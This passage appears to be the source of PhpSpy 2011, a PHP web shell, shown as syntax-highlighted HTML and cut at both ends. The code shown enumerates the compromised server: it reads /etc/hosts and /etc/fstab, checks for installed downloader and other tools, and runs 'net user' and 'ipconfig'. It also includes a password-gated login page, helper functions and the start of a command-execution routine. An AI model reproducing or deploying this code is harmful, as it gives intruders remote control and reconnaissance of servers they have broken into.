<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">which(</span>$<span style="color: #ffcc66;">item</span>)){$<span style="color: #ffcc66;">temp</span>[]=$<span style="color: #ffcc66;">item</span>;}
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Userful'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">implode(</span><span style="color: #66cccc;">', '</span>,$<span style="color: #ffcc66;">temp</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">danger</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">item</span>)
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">which(</span>$<span style="color: #ffcc66;">item</span>)){$<span style="color: #ffcc66;">temp</span>[]=$<span style="color: #ffcc66;">item</span>;}
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Danger'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">implode(</span><span style="color: #66cccc;">', '</span>,$<span style="color: #ffcc66;">temp</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">downloaders</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">item</span>)<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">which(</span>$<span style="color: #ffcc66;">item</span>)){$<span style="color: #ffcc66;">temp</span>[]=$<span style="color: #ffcc66;">item</span>;}
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Downloaders'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">implode(</span><span style="color: #66cccc;">', '</span>,$<span style="color: #ffcc66;">temp</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Hosts'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">file_get_contents(</span><span style="color: #66cccc;">'/etc/hosts'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'HDD space'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">'df -h'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Mount options'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">file_get_contents(</span><span style="color: #66cccc;">'/etc/fstab'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'OS Version'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">'ver'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Account Settings'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">'net accounts'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'User Accounts'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">'net user'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'IP Configurate'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">'ipconfig -all'</span>));
<span style="background-color: #515151;"> </span>   }
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end</span>

<span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Undefined Action'</span>);
}

<span style="color: #cc99cc;">?&gt;</span>
<span style="color: #6699cc;">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span style="color: #6699cc;">&lt;div</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;</span><span style="color: #66cccc; text-decoration: underline;">background:#eee;"</span><span style="color: #6699cc; text-decoration: underline;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;span</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"float:right;"</span><span style="color: #6699cc;">&gt;</span><span style="color: #cc99cc;">&lt;?php</span> <span style="color: #cccccc; background-color: #2d2d2d;">debuginfo(</span>);<span style="color: #cccccc; background-color: #2d2d2d;">ob_end_flush(</span>);<span style="color: #cc99cc;">?&gt;</span><span style="color: #6699cc;">&lt;/span&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">Powered</span> <span style="color: #f2777a; font-weight: bold;">by</span> <span style="color: #6699cc;">&lt;a</span> <span style="color: #6699cc;">title=</span><span style="color: #66cccc;">"Build 20110502"</span> <span style="color: #6699cc;">href=</span><span style="color: #66cccc;">"http://www.4ngel.net"</span> <span style="color: #6699cc;">target=</span><span style="color: #66cccc;">"_bl</span><span style="color: #66cccc; text-decoration: underline;">ank"</span><span style="color: #6699cc; text-decoration: underline;">&gt;</span><span style="color: #cc99cc; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #99cc99; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">str_replace(</span><span style="color: #66cccc; text-decoration: underline;">'.'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'P.h.p.S.p.y'</span><span style="text-decoration: underline;">);</span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">2011</span><span style="color: #6699cc; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;">. </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">Copyright (</span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">C</span><span style="text-decoration: underline;">) </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">2004</span><span style="text-decoration: underline;">-</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">2011</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">&lt;a</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">href=</span><span style="color: #66cccc; text-decoration: underline;">"http://www.4ngel.net"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">target=</span><span style="color: #66cccc; text-decoration: underline;">"_blank"</span><span style="color: #6699cc; text-decoration: underline;">&gt;</span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">Security</span><span style="text-decoration: underline;"> </span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">Angel</span><span style="text-decoration: underline;"> </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">Team [</span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">S4T</span><span style="text-decoration: underline;">]</span><span style="color: #6699cc; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">All</span><span style="text-decoration: underline;"> </span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">Rights</span><span style="text-decoration: underline;"> </span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">Reserved</span><span style="text-decoration: underline;">.</span>
<span style="color: #6699cc;">&lt;/div&gt;</span>
<span style="color: #6699cc;">&lt;/body&gt;</span>
<span style="color: #6699cc;">&lt;/html&gt;</span>

<span style="color: #cc99cc;">&lt;?php</span>

<span style="color: #999999; font-style: italic;">/*</span><span style="color: #999999; font-style: italic;">======================================================</span>
<span style="color: #999999; font-style: italic;">&#20989;&#25968;&#24211;</span>
<span style="color: #999999; font-style: italic;">======================================================*/</span>

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">secparam</span>($<span style="color: #ffcc66;">n</span>, $<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">v</span> = <span style="color: #cccccc; background-color: #2d2d2d;">trim(</span>$<span style="color: #ffcc66;">v</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;'</span>.$<span style="color: #ffcc66;">n</span>.<span style="color: #66cccc;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;div class="infolist"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">strpos(</span>$<span style="color: #ffcc66;">v</span>, <span style="color: #66cccc;">"\n"</span>) === <span style="color: #6699cc;">false</span>)
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">v</span>.<span style="color: #66cccc;">'&lt;br /&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">else</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;pre&gt;'</span>.$<span style="color: #ffcc66;">v</span>.<span style="color: #66cccc;">'&lt;/pre&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/div&gt;'</span>);
<span style="background-color: #515151;"> </span>   }
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">m</span>($<span style="color: #ffcc66;">msg</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s</span><span style="color: #66cccc; text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">msg</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">'&lt;/div&gt;'</span>;
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">scookie</span>($<span style="color: #ffcc66;">key</span>, $<span style="color: #ffcc66;">value</span>, $<span style="color: #ffcc66;">life</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>, $<span style="color: #ffcc66;">prefix</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">timestamp</span>, $<span style="color: #6699cc;">_SERVER</span>, $<span style="color: #ffcc66;">cookiepre</span>, $<span style="color: #ffcc66;">cookiedomain</span>, $<span style="color: #ffcc66;">cookiepath</span>, $<span style="color: #ffcc66;">cookie</span><span style="color: #ffcc66; text-decoration: underline;">life</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">key</span> = ($<span style="color: #ffcc66;">prefix</span> ? $<span style="color: #ffcc66;">cookiepre</span> : <span style="color: #66cccc;">''</span>).$<span style="color: #ffcc66;">key</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">life</span> = $<span style="color: #ffcc66;">life</span> ? $<span style="color: #ffcc66;">life</span> : $<span style="color: #ffcc66;">cookielife</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">useport</span> = $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_PORT'</span>] == <span style="color: #cccccc; background-color: #2d2d2d;">443</span> ? <span style="color: #cccccc; background-color: #2d2d2d;">1</span> : <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">setcookie(</span>$<span style="color: #ffcc66;">key</span>, $<span style="color: #ffcc66;">value</span>, $<span style="color: #ffcc66;">timestamp</span>+$<span style="color: #ffcc66;">life</span>, $<span style="color: #ffcc66;">cookiepath</span>, $<span style="color: #ffcc66;">cookiedomain</span>, $<span style="color: #ffcc66;">usepo</span><span style="color: #ffcc66; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
}<span style="color: #f2777a; background-color: #515151;">   </span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">multi</span>($<span style="color: #ffcc66;">num</span>, $<span style="color: #ffcc66;">perpage</span>, $<span style="color: #ffcc66;">curpage</span>, $<span style="color: #ffcc66;">tablename</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">multipage</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">num</span> &gt; $<span style="color: #ffcc66;">perpage</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">page</span> = <span style="color: #cccccc; background-color: #2d2d2d;">10</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">offset</span> = <span style="color: #cccccc; background-color: #2d2d2d;">5</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">pages</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">ceil(</span>$<span style="color: #ffcc66;">num</span> / $<span style="color: #ffcc66;">perpage</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">page</span> &gt; $<span style="color: #ffcc66;">pages</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">from</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">to</span> = $<span style="color: #ffcc66;">pages</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">from</span> = $<span style="color: #ffcc66;">curpage</span> - $<span style="color: #ffcc66;">offset</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">to</span> = $<span style="color: #ffcc66;">curpage</span> + $<span style="color: #ffcc66;">page</span> - $<span style="color: #ffcc66;">offset</span> - <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">from</span> &lt; <span style="color: #cccccc; background-color: #2d2d2d;">1</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">to</span> = $<span style="color: #ffcc66;">curpage</span> + <span style="color: #cccccc; background-color: #2d2d2d;">1</span> - $<span style="color: #ffcc66;">from</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">from</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(($<span style="color: #ffcc66;">to</span> - $<span style="color: #ffcc66;">from</span>) &lt; $<span style="color: #ffcc66;">page</span> &amp;&amp; ($<span style="color: #ffcc66;">to</span> - $<span style="color: #ffcc66;">from</span>) &lt; $<span style="color: #ffcc66;">pages</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">to</span> = $<span style="color: #ffcc66;">page</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>($<span style="color: #ffcc66;">to</span> <span style="color: #6699cc;">&gt;</span> $<span style="color: #ffcc66;">pages</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">from</span> = $<span style="color: #ffcc66;">curpage</span> - $<span style="color: #ffcc66;">pages</span> + $<span style="color: #ffcc66;">to</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">to</span> = $<span style="color: #ffcc66;">pages</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(($<span style="color: #ffcc66;">to</span> - $<span style="color: #ffcc66;">from</span>) &lt; $<span style="color: #ffcc66;">page</span> &amp;&amp; ($<span style="color: #ffcc66;">to</span> - $<span style="color: #ffcc66;">from</span>) &lt; $<span style="color: #ffcc66;">pages</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">from</span> = $<span style="color: #ffcc66;">pages</span> - $<span style="color: #ffcc66;">page</span> + <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">multipage</span> = ($<span style="color: #ffcc66;">curpage</span> - $<span style="color: #ffcc66;">offset</span> <span style="color: #6699cc;">&gt;</span> <span style="color: #cccccc; background-color: #2d2d2d;">1</span> &amp;&amp; $<span style="color: #ffcc66;">pages</span> &gt; $<span style="color: #ffcc66;">page</span> ? <span style="color: #66cccc;">'&lt;a href="javas</span><span style="color: #66cccc; text-decoration: underline;">cript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffcc66; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> &gt; </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;"> ? </span><span style="color: #66cccc; text-decoration: underline;">'&lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #ffcc66; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> - </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">');"&gt;Prev&lt;/a&gt; '</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">i</span> = $<span style="color: #ffcc66;">from</span>; $<span style="color: #ffcc66;">i</span> &lt;= $<span style="color: #ffcc66;">to</span>; $<span style="color: #ffcc66;">i</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">multipage</span> .= $<span style="color: #ffcc66;">i</span> == $<span style="color: #ffcc66;">curpage</span> ? $<span style="color: #ffcc66;">i</span>.<span style="color: #66cccc;">' '</span> : <span style="color: #66cccc;">'&lt;a href="javascript:settabl</span><span style="color: #66cccc; text-decoration: underline;">e(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">');"&gt;['</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">i</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">']&lt;/a&gt; '</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">multipage</span> .= ($<span style="color: #ffcc66;">curpage</span> &lt; $<span style="color: #ffcc66;">pages</span> ? <span style="color: #66cccc;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #ffcc66;">ta</span><span style="color: #ffcc66; text-decoration: underline;">blename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.($</span><span style="color: #ffcc66; text-decoration: underline;">curpage</span><span style="text-decoration: underline;"> + </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">');"&gt;Next&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffcc66; text-decoration: underline;">to</span><span style="text-decoration: underline;"> &lt; $</span><span style="color: #ffcc66; text-decoration: underline;">pages</span><span style="text-decoration: underline;"> ? </span><span style="color: #66cccc; text-decoration: underline;">' &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'\', '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">pages</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">');"&gt;Last&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">multipage</span> = $<span style="color: #ffcc66;">multipage</span> ? <span style="color: #66cccc;">'&lt;p&gt;Pages: '</span>.$<span style="color: #ffcc66;">multipage</span>.<span style="color: #66cccc;">'&lt;/p&gt;'</span> : <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">multipage</span>;
}
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">loginpage</span>() {
<span style="color: #cc99cc;">?&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;style</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"text/css"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">input</span> {<span style="color: #f2777a; font-weight: bold;">font</span>:<span style="color: #cccccc; background-color: #2d2d2d;">11</span>px <span style="color: #f2777a; font-weight: bold;">Verdana</span>;<span style="color: #f2777a; font-weight: bold;">BACKGROUND</span>: <span style="color: #999999; font-style: italic;">#FFFFFF;height: 18px;border: 1px solid </span><span style="color: #999999; font-style: italic; text-decoration: underline;">#666666;}</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/style&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;form</span> <span style="color: #6699cc;">method=</span><span style="color: #66cccc;">"POST"</span> <span style="color: #6699cc;">action=</span><span style="color: #66cccc;">""</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;span</span> <span style="color: #6699cc;">style=</span><span style="color: #66cccc;">"font:11px Verdana;"</span><span style="color: #6699cc;">&gt;</span><span style="color: #f2777a; font-weight: bold;">Password</span>: <span style="color: #6699cc;">&lt;/span&gt;&lt;input</span> <span style="color: #6699cc;">name=</span><span style="color: #66cccc;">"password"</span> <span style="color: #6699cc;">typ</span><span style="color: #6699cc; text-decoration: underline;">e=</span><span style="color: #66cccc; text-decoration: underline;">"password"</span><span style="text-decoration: underline;"> </span><span style="color: #6699cc; text-decoration: underline;">size=</span><span style="color: #66cccc; text-decoration: underline;">"20"</span><span style="color: #6699cc; text-decoration: underline;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;input</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"hidden"</span> <span style="color: #6699cc;">name=</span><span style="color: #66cccc;">"action"</span> <span style="color: #6699cc;">value=</span><span style="color: #66cccc;">"login"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;input</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"submit"</span> <span style="color: #6699cc;">value=</span><span style="color: #66cccc;">"Login"</span><span style="color: #6699cc;">&gt;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #6699cc;">&lt;/form&gt;</span>
<span style="color: #cc99cc;">&lt;?php</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end loginpage()</span>

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">execute</span>($<span style="color: #ffcc66;">cfe</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #66cccc;">''</span>;
